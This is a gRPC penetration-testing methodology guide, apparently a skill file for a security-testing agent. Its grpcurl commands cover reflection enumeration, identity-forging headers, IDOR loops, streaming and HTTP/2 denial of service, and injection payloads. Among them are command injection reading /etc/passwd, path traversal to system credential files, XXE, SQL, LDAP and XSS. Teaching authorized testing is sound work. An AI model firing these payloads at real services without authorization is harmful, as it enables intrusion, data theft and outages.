<grpc_testing_guide>
<title>gRPC SECURITY TESTING</title>

<critical>gRPC services using Protocol Buffers require specialized testing approaches. Focus on reflection API enumeration, authentication bypass, message manipulation, streaming vulnerabilities, and HTTP/2 protocol-level attacks.</critical>

<scope>
- gRPC reflection API enumeration and abuse
- Protobuf message manipulation and fuzzing
- Authentication and authorization bypass
- Stream hijacking and manipulation
- Error-based information disclosure
- HTTP/2 protocol attacks (HPACK bombing, flow control)
- gRPC-Web bridge vulnerabilities
- Metadata (header) injection
</scope>

<methodology>
1. Discover gRPC services via reflection API or proto file analysis
2. Enumerate methods and message structures
3. Test authentication mechanisms for bypass
4. Probe authorization on each method individually
5. Fuzz message fields for injection and validation flaws
6. Test streaming endpoints for resource exhaustion
7. Analyze error messages for information disclosure
</methodology>

<service_discovery>
<reflection_enumeration>
{% raw %}
# gRPC Server Reflection Protocol
# RFC: https://github.com/grpc/grpc/blob/master/doc/server-reflection.md

# Check if reflection is enabled
grpcurl -plaintext localhost:50051 list

# List all services
grpcurl -plaintext target.com:443 list
# Output:
# grpc.reflection.v1alpha.ServerReflection
# mypackage.UserService
# mypackage.AdminService
# mypackage.PaymentService

# Describe a service (get all methods)
grpcurl -plaintext target.com:443 describe mypackage.UserService
# Output:
# service UserService {
#   rpc GetUser ( .mypackage.GetUserRequest ) returns ( .mypackage.User );
#   rpc UpdateUser ( .mypackage.UpdateUserRequest ) returns ( .mypackage.User );
#   rpc DeleteUser ( .mypackage.DeleteUserRequest ) returns ( .google.protobuf.Empty );
#   rpc ListUsers ( .mypackage.ListUsersRequest ) returns ( stream .mypackage.User );
# }

# Describe a message type
grpcurl -plaintext target.com:443 describe mypackage.User
# Output:
# message User {
#   string user_id = 1;
#   string email = 2;
#   string role = 3;
#   int64 created_at = 4;
#   bool is_active = 5;
# }

# Describe a method specifically
grpcurl -plaintext target.com:443 describe mypackage.UserService.GetUser
# Shows request and response types
{% endraw %}
</reflection_enumeration>

<proto_analysis>
{% raw %}
# If proto files are available (source code, mobile app decompilation)

# Extract from Android APK
unzip app.apk
find . -name "*.proto"
find . -name "*descriptor*"

# Extract from iOS IPA  
unzip app.ipa
find . -name "*.proto"

# Decompile proto descriptors
protoc --decode_raw < descriptor.bin

# Generate client stubs from proto
protoc --python_out=. --grpc_python_out=. service.proto
protoc --go_out=. --go-grpc_out=. service.proto
{% endraw %}
</proto_analysis>

<endpoint_identification>
{% raw %}
# gRPC characteristics

# HTTP/2 indicators:
# - Content-Type: application/grpc
# - POST method only
# - Path: /{package}.{service}/{method}

# Example request:
POST /mypackage.UserService/GetUser HTTP/2
Host: api.example.com
Content-Type: application/grpc
TE: trailers
User-Agent: grpc-go/1.40.0

# Common ports:
# - 443 (HTTPS)
# - 50051 (common default)
# - 8080 (insecure)
# - 9090 (metrics/admin)

# Network traffic patterns:
# - HTTP/2 SETTINGS frame
# - Binary Protocol Buffer data
# - Trailers with grpc-status
{% endraw %}
</endpoint_identification>

<hidden_services>
{% raw %}
# Look for internal/admin services

# Common naming patterns:
# - InternalService
# - AdminService  
# - DebugService
# - HealthService
# - MetricsService

# Health check endpoint (standard)
grpcurl -plaintext target.com:443 grpc.health.v1.Health/Check

# Metrics/observability
grpcurl -plaintext target.com:443 grpc.observability.v1.Metrics/Get
{% endraw %}
</hidden_services>
</service_discovery>

<authentication_testing>
<no_authentication>
{% raw %}
# Test methods without any credentials

# Attempt direct access
grpcurl -plaintext -d '{"user_id": "123"}' \
  target.com:443 mypackage.UserService/GetUser

# If successful, authentication is missing
# Test each method individually as coverage may be inconsistent

# Script to test all methods
for method in $(grpcurl -plaintext target.com:443 list mypackage.UserService | grep rpc | awk '{print $2}'); do
  echo "Testing: $method"
  grpcurl -plaintext -d '{}' target.com:443 "mypackage.UserService/$method"
done
{% endraw %}
</no_authentication>

<token_authentication>
{% raw %}
# gRPC uses metadata (HTTP/2 headers) for auth

# Standard authorization header
grpcurl -plaintext \
  -H "Authorization: Bearer eyJhbGc..." \
  -d '{"user_id": "123"}' \
  target.com:443 mypackage.UserService/GetUser

# Custom token headers
grpcurl -plaintext \
  -H "x-api-key: abc123" \
  -H "x-auth-token: xyz789" \
  -d '{"user_id": "123"}' \
  target.com:443 mypackage.UserService/GetUser

# Test without token
grpcurl -plaintext -d '{"user_id": "123"}' \
  target.com:443 mypackage.UserService/GetUser
# Expected: Unauthenticated error
# Actual (vulnerable): Returns data

# Test with invalid token
grpcurl -plaintext \
  -H "Authorization: Bearer invalid_token" \
  -d '{"user_id": "123"}' \
  target.com:443 mypackage.UserService/GetUser

# Test with expired token
grpcurl -plaintext \
  -H "Authorization: Bearer <expired_jwt>" \
  -d '{"user_id": "123"}' \
  target.com:443 mypackage.UserService/GetUser

# Token from different service/scope
grpcurl -plaintext \
  -H "Authorization: Bearer <other_service_token>" \
  -d '{"user_id": "123"}' \
  target.com:443 mypackage.UserService/GetUser
{% endraw %}
</token_authentication>

<mtls_testing>
{% raw %}
# Mutual TLS authentication

# Test without client certificate
grpcurl -insecure target.com:443 mypackage.UserService/GetUser
# Expected: TLS handshake failure
# Actual (vulnerable): Connection succeeds

# Test with self-signed certificate
grpcurl -cert self_signed.crt -key self_signed.key \
  target.com:443 mypackage.UserService/GetUser

# Test with valid cert for different CN/SAN
grpcurl -cert other_service.crt -key other_service.key \
  target.com:443 mypackage.UserService/GetUser

# Certificate validation bypass
# Check if server validates:
# - Certificate chain (CA)
# - Certificate revocation (CRL/OCSP)
# - Common Name (CN)
# - Subject Alternative Names (SAN)
# - Certificate expiration
{% endraw %}
</mtls_testing>

<authentication_bypass>
{% raw %}
# Common bypass techniques

# Metadata injection to forge identity
grpcurl -plaintext \
  -H "x-user-id: admin" \
  -H "x-role: administrator" \
  -H "x-authenticated: true" \
  -d '{"user_id": "123"}' \
  target.com:443 mypackage.UserService/GetUser

# Forwarded headers
grpcurl -plaintext \
  -H "x-forwarded-user: admin" \
  -H "x-forwarded-role: admin" \
  -d '{"user_id": "123"}' \
  target.com:443 mypackage.UserService/GetUser

# Internal service header
grpcurl -plaintext \
  -H "x-internal-call: true" \
  -H "x-service-name: internal-service" \
  -d '{"user_id": "123"}' \
  target.com:443 mypackage.UserService/GetUser

# Proxy headers (if behind proxy)
grpcurl -plaintext \
  -H "x-real-ip: 127.0.0.1" \
  -H "x-forwarded-for: 127.0.0.1" \
  -d '{"user_id": "123"}' \
  target.com:443 mypackage.UserService/GetUser
{% endraw %}
</authentication_bypass>
</authentication_testing>

<authorization_testing>
<idor_horizontal>
{% raw %}
# Broken Object Level Authorization (BOLA/IDOR)

# Authenticated as user_123
grpcurl -plaintext \
  -H "Authorization: Bearer user_123_token" \
  -d '{"user_id": "123"}' \
  target.com:443 mypackage.UserService/GetUser
# Expected: Success (own data)

# Try to access user_456's data
grpcurl -plaintext \
  -H "Authorization: Bearer user_123_token" \
  -d '{"user_id": "456"}' \
  target.com:443 mypackage.UserService/GetUser
# Expected: Forbidden
# Actual (vulnerable): Returns user_456's data

# Enumeration
for i in {1..100}; do
  grpcurl -plaintext \
    -H "Authorization: Bearer $TOKEN" \
    -d "{\"user_id\": \"$i\"}" \
    target.com:443 mypackage.UserService/GetUser >> results.txt
done

# UUID enumeration
grpcurl -plaintext \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"user_id": "00000000-0000-0000-0000-000000000001"}' \
  target.com:443 mypackage.UserService/GetUser
{% endraw %}
</idor_horizontal>

<privilege_escalation>
{% raw %}
# Broken Function Level Authorization (BFLA)

# Regular user tries admin method
grpcurl -plaintext \
  -H "Authorization: Bearer regular_user_token" \
  -d '{"user_id": "123"}' \
  target.com:443 mypackage.AdminService/DeleteUser
# Expected: Forbidden
# Actual (vulnerable): User deleted

# Hidden/undocumented admin methods
grpcurl -plaintext \
  -H "Authorization: Bearer regular_user_token" \
  list mypackage.AdminService

grpcurl -plaintext \
  -H "Authorization: Bearer regular_user_token" \
  -d '{}' \
  target.com:443 mypackage.AdminService/ListAllUsers

# Internal methods exposed
grpcurl -plaintext list mypackage.InternalService
grpcurl -plaintext -d '{}' target.com:443 mypackage.InternalService/DebugInfo
{% endraw %}
</privilege_escalation>

<mass_assignment>
{% raw %}
# Inject privileged fields in message

# Update user profile
grpcurl -plaintext \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "user_id": "123",
    "email": "new@example.com",
    "role": "admin",
    "is_verified": true,
    "permissions": ["read", "write", "admin"]
  }' \
  target.com:443 mypackage.UserService/UpdateUser

# Even if fields are not in proto definition
# Protobuf3 ignores unknown fields by default
# But server logic may process them

# Test numeric field IDs directly (if proto known)
# Field numbers may reveal hidden fields
{% endraw %}
</mass_assignment>
</authorization_testing>

<message_manipulation>
<field_fuzzing>
{% raw %}
# Type confusion
grpcurl -plaintext -d '{"user_id": "123"}' target.com:443 mypackage.UserService/GetUser
grpcurl -plaintext -d '{"user_id": 123}' target.com:443 mypackage.UserService/GetUser

# Boundary values
grpcurl -plaintext -d '{"count": -1}' target.com:443 mypackage.UserService/ListUsers
grpcurl -plaintext -d '{"count": 0}' target.com:443 mypackage.UserService/ListUsers
grpcurl -plaintext -d '{"count": 999999999}' target.com:443 mypackage.UserService/ListUsers
grpcurl -plaintext -d '{"count": 2147483647}' target.com:443 mypackage.UserService/ListUsers

# Negative amounts
grpcurl -plaintext -d '{"amount": -1000}' target.com:443 mypackage.PaymentService/Transfer

# Empty/null values
grpcurl -plaintext -d '{}' target.com:443 mypackage.UserService/UpdateUser
grpcurl -plaintext -d '{"user_id": ""}' target.com:443 mypackage.UserService/GetUser
grpcurl -plaintext -d '{"user_id": null}' target.com:443 mypackage.UserService/GetUser

# Large strings
grpcurl -plaintext -d "{\"name\": \"$('A' * 10000)\"}" target.com:443 mypackage.UserService/CreateUser

# Unicode and special characters  
grpcurl -plaintext -d '{"name": "test\u0000user"}' target.com:443 mypackage.UserService/CreateUser
grpcurl -plaintext -d '{"name": "test\nuser\r\n"}' target.com:443 mypackage.UserService/CreateUser
{% endraw %}
</field_fuzzing>

<injection_attacks>
{% raw %}
# SQL Injection
grpcurl -plaintext -d '{"query": "test\" OR 1=1--"}' \
  target.com:443 mypackage.SearchService/Search

grpcurl -plaintext -d '{"email": "admin@example.com\" OR \"1\"=\"1"}' \
  target.com:443 mypackage.UserService/GetUserByEmail

# NoSQL Injection
grpcurl -plaintext -d '{"query": "{\"$gt\": \"\"}"}' \
  target.com:443 mypackage.SearchService/Search

# Command Injection
grpcurl -plaintext -d '{"filename": "test.txt; cat /etc/passwd"}' \
  target.com:443 mypackage.FileService/ProcessFile

grpcurl -plaintext -d '{"command": "status; id"}' \
  target.com:443 mypackage.SystemService/Execute

# Path Traversal
grpcurl -plaintext -d '{"path": "../../../etc/passwd"}' \
  target.com:443 mypackage.FileService/ReadFile

grpcurl -plaintext -d '{"filename": "..\\..\\..\\windows\\system32\\config\\sam"}' \
  target.com:443 mypackage.FileService/ReadFile

# LDAP Injection
grpcurl -plaintext -d '{"username": "admin)(uid=*))(|(uid=*"}' \
  target.com:443 mypackage.AuthService/Login

# XSS (if data rendered in web UI)
grpcurl -plaintext -d '{"name": "<script>alert(1)</script>"}' \
  target.com:443 mypackage.UserService/CreateUser

grpcurl -plaintext -d '{"comment": "<img src=x onerror=alert(1)>"}' \
  target.com:443 mypackage.CommentService/AddComment

# Template Injection
grpcurl -plaintext -d '{"template": "{{7*7}}"}' \
  target.com:443 mypackage.TemplateService/Render

# XXE (if XML processing involved)
grpcurl -plaintext -d '{"xml_data": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"}' \
  target.com:443 mypackage.XmlService/Process
{% endraw %}
</injection_attacks>

<oneof_manipulation>
{% raw %}
# Protobuf oneof fields allow only one variant

# Example proto:
# message Request {
#   oneof request_type {
#     UserRequest user = 1;
#     AdminRequest admin = 2;
#   }
# }

# Try setting privileged variant
grpcurl -plaintext -d '{"admin": {"action": "delete_all"}}' \
  target.com:443 mypackage.Service/Process

# Try setting multiple (should be rejected but test)
grpcurl -plaintext -d '{"user": {...}, "admin": {...}}' \
  target.com:443 mypackage.Service/Process
{% endraw %}
</oneof_manipulation>

<repeated_fields>
{% raw %}
# Repeated fields (arrays)

# Empty array
grpcurl -plaintext -d '{"items": []}' target.com:443 mypackage.Service/Process

# Large array (DoS potential)
grpcurl -plaintext -d '{"items": [1,2,3,...1000000]}' target.com:443 mypackage.Service/Process

# Duplicate values
grpcurl -plaintext -d '{"ids": ["123", "123", "123"]}' target.com:443 mypackage.Service/Process

# Mixed types (if validation weak)
grpcurl -plaintext -d '{"items": [1, "string", true, null]}' target.com:443 mypackage.Service/Process
{% endraw %}
</repeated_fields>
</message_manipulation>

<metadata_attacks>
<header_injection>
{% raw %}
# gRPC metadata = HTTP/2 headers

# Custom headers to forge identity/permissions
grpcurl -plaintext \
  -H "x-user-id: admin" \
  -H "x-role: administrator" \
  -H "x-tenant-id: all" \
  -d '{"user_id": "123"}' \
  target.com:443 mypackage.UserService/GetUser

# Internal service indicators
grpcurl -plaintext \
  -H "x-internal-call: true" \
  -H "x-service-to-service: true" \
  -H "x-bypass-auth: true" \
  -d '{"user_id": "123"}' \
  target.com:443 mypackage.UserService/GetUser

# IP spoofing headers
grpcurl -plaintext \
  -H "x-forwarded-for: 127.0.0.1" \
  -H "x-real-ip: 127.0.0.1" \
  -H "x-originating-ip: 127.0.0.1" \
  -d '{"user_id": "123"}' \
  target.com:443 mypackage.UserService/GetUser

# Custom auth headers (API gateways)
grpcurl -plaintext \
  -H "x-api-key: test" \
  -H "x-client-id: trusted-client" \
  -d '{"user_id": "123"}' \
  target.com:443 mypackage.UserService/GetUser

# Metadata injection via CRLF
# (if application processes headers unsafely)
grpcurl -plaintext \
  -H "user-agent: test%0d%0ax-admin: true" \
  -d '{"user_id": "123"}' \
  target.com:443 mypackage.UserService/GetUser
{% endraw %}
</header_injection>

<deadline_manipulation>
{% raw %}
# gRPC deadline (timeout) control

# Very long deadline (resource exhaustion)
grpcurl -plaintext \
  -connect-timeout 3600 \
  -max-time 3600 \
  -d '{}' \
  target.com:443 mypackage.Service/LongRunningOperation

# Very short deadline (partial operations)
# May cause incomplete transactions
grpcurl -plaintext \
  -connect-timeout 0.001 \
  -max-time 0.001 \
  -d '{"amount": 1000}' \
  target.com:443 mypackage.PaymentService/Transfer

# Check if deadline propagates to downstream services
# Improper propagation may cause cascading failures
{% endraw %}
</deadline_manipulation>
</metadata_attacks>

<streaming_attacks>
<client_streaming>
{% raw %}
# Client sends stream of messages

# Massive stream (resource exhaustion)
for i in {1..1000000}; do
  echo "{\"data\": \"chunk_$i\"}"
done | grpcurl -plaintext -d @ target.com:443 mypackage.Service/Upload

# Never-ending stream
mkfifo stream_pipe
cat stream_pipe | grpcurl -plaintext -d @ target.com:443 mypackage.Service/Upload &
# Stream continues indefinitely

# Stream with malformed messages
echo '{"data": "valid"}' > stream.txt
echo '{invalid json}' >> stream.txt
echo '{"data": "valid"}' >> stream.txt
cat stream.txt | grpcurl -plaintext -d @ target.com:443 mypackage.Service/Upload

# Abrupt disconnect (resource leak?)
timeout 1 grpcurl -plaintext -d @ target.com:443 mypackage.Service/Upload <<EOF
{"data": "test"}
EOF
# Check if server cleans up resources
{% endraw %}
</client_streaming>

<server_streaming>
{% raw %}
# Server sends stream of messages

# Request huge stream (DoS)
grpcurl -plaintext -d '{"limit": 999999999}' \
  target.com:443 mypackage.Service/StreamAll

# Request stream without limit
grpcurl -plaintext -d '{}' \
  target.com:443 mypackage.Service/Subscribe
# Does it ever end?

# Filter bypass
grpcurl -plaintext -d '{"filter": ""}' \
  target.com:443 mypackage.Service/ListUsers
# Empty filter may bypass access controls

# Cancel stream mid-way
timeout 5 grpcurl -plaintext -d '{}' target.com:443 mypackage.Service/StreamAll
# Check server resource cleanup
{% endraw %}
</server_streaming>

<bidirectional_streaming>
{% raw %}
# Both client and server stream

# Most complex attack surface
# Test for:
# - Race conditions in message handling
# - Out-of-order message processing
# - Stream hijacking (if connection reused)
# - Message correlation issues

# Example test
grpcurl -plaintext -d @ target.com:443 mypackage.ChatService/Chat <<EOF
{"message": "hello"}
{"message": "world"}
{"message": "test"}
EOF

# Rapid message sending
for i in {1..1000}; do
  echo "{\"message\": \"msg_$i\"}"
done | grpcurl -plaintext -d @ target.com:443 mypackage.ChatService/Chat

# Mixed message types
grpcurl -plaintext -d @ target.com:443 mypackage.Service/Process <<EOF
{"type": "command", "data": "start"}
{"type": "data", "data": "content"}
{"type": "command", "data": "stop"}
{"type": "data", "data": "more content"}
{"type": "command", "data": "stop"}
EOF
{% endraw %}
</bidirectional_streaming>
</streaming_attacks>

<http2_protocol_attacks>
<hpack_bombing>
{% raw %}
# HPACK header compression attack
# Send many headers to exhaust dynamic table

# Large number of unique headers
for i in {1..10000}; do
  echo "-H \"x-custom-header-$i: value$i\""
done

# Each unique header adds to HPACK dynamic table
# Can cause memory exhaustion
{% endraw %}
</hpack_bombing>

<stream_multiplexing_abuse>
{% raw %}
# HTTP/2 allows many concurrent streams

# Open many streams simultaneously
for i in {1..1000}; do
  grpcurl -plaintext -d '{"id": "'$i'"}' \
    target.com:443 mypackage.Service/Get &
done

# May exhaust server resources
# Check MAX_CONCURRENT_STREAMS setting
{% endraw %}
</stream_multiplexing_abuse>

<flow_control_attacks>
{% raw %}
# HTTP/2 flow control manipulation

# Send WINDOW_UPDATE frames to control flow
# Requires low-level HTTP/2 client

# Reduce window size to slow server
# Or increase to request large data
{% endraw %}
</flow_control_attacks>

<ping_flood>
{% raw %}
# PING frame flood

# Send excessive PING frames
# Server must respond to each
# Can cause DoS

# Requires custom HTTP/2 client
{% endraw %}
</ping_flood>
</http2_protocol_attacks>

<grpc_web_testing>
<concept>
{% raw %}
# gRPC-Web allows browser access to gRPC
# Uses HTTP/1.1 with special encoding
# Often deployed alongside native gRPC

# Different authentication from native gRPC
# May have different security controls
{% endraw %}
</concept>

<testing_approach>
{% raw %}
# Identify gRPC-Web endpoint
# Content-Type: application/grpc-web-text or application/grpc-web+proto

# Test via HTTP/1.1
curl -X POST \
  -H "Content-Type: application/grpc-web-text" \
  -H "X-Grpc-Web: 1" \
  -d "base64_encoded_message" \
  https://target.com/mypackage.UserService/GetUser

# Check if authentication differs
curl -X POST \
  -H "Content-Type: application/grpc-web-text" \
  -H "X-Grpc-Web: 1" \
  -d "..." \
  https://target.com/mypackage.UserService/GetUser
# vs
grpcurl -H "Authorization: Bearer token" \
  target.com:443 mypackage.UserService/GetUser

# Test both native gRPC and gRPC-Web
# Different code paths may have different vulnerabilities
{% endraw %}
</testing_approach>
</grpc_web_testing>

<error_analysis>
<information_disclosure>
{% raw %}
# gRPC error messages can leak information

# Stack traces
grpcurl -plaintext -d '{"id": "invalid"}' \
  target.com:443 mypackage.Service/Get
# Look for file paths, function names, SQL queries

# Internal IP addresses
# Error: "Failed to connect to database at 10.0.1.50:5432"

# Technology stack information
# Error: "PostgreSQL error: ..."
# Error: "Redis connection failed..."

# Sensitive data in error details
# Error: "User test@example.com not found"
# Confirms email existence

# SQL query exposure
# Error: "SQL error: SELECT * FROM users WHERE id = 'abc'"
# Reveals table structure

# gRPC status details
# May contain sensitive information in metadata
{% endraw %}
</information_disclosure>
</error_analysis>

<validation>
1. Demonstrate unauthorized method access via reflection
2. Prove authentication bypass with reproducible request
3. Show IDOR by accessing other users' data
4. Document message manipulation leading to privilege escalation
5. Provide grpcurl commands that reproduce the vulnerability
6. Show error messages revealing sensitive information
7. Demonstrate impact (data access, privilege escalation, DoS)
</validation>

<false_positives>
- Reflection API disabled in production
- Proper authentication on all methods
- Authorization enforced at method and message field level
- Input validation preventing injection
- Rate limiting on all endpoints
- Proper error handling without information disclosure
- Stream resource limits enforced
</false_positives>

<impact>
- Service enumeration via reflection
- Authentication bypass
- Authorization bypass (IDOR, privilege escalation)
- Data manipulation and injection attacks
- Denial of service via streaming abuse
- Information disclosure
- Remote code execution via injection
</impact>

<pro_tips>
1. Always check reflection API first—it's a complete service roadmap
2. Use grpcui for interactive testing (generates UI from reflection)
3. Test each method individually—coverage is often inconsistent
4. Protobuf doesn't enforce business logic constraints—fuzz boundaries
5. Check both native gRPC and gRPC-Web if available
6. Metadata (headers) are critical attack surface
7. Error messages often leak internal details
8. Streaming endpoints are high-value DoS targets
9. Look for admin/internal services alongside public ones
10. HTTP/2 tools (h2load, h2spec) useful for protocol testing
11. Binary nature creates false security through obscurity
12. Test with malformed protobuf to check parser robustness
13. Check if idempotency keys protect state-changing methods
14. Stream cancellation should clean up resources properly
15. gRPC interceptors may have inconsistent auth logic
</pro_tips>

<remember>gRPC's binary format and lack of browser dev tools create security blind spots. Reflection API often exposes the entire service definition. Test authentication on every method—coverage is typically inconsistent. Message validation is often weak because protobuf only enforces types, not business logic. Streaming endpoints are particularly vulnerable to resource exhaustion. Always test both gRPC and gRPC-Web paths as they may have different security controls.</remember>
</grpc_testing_guide>
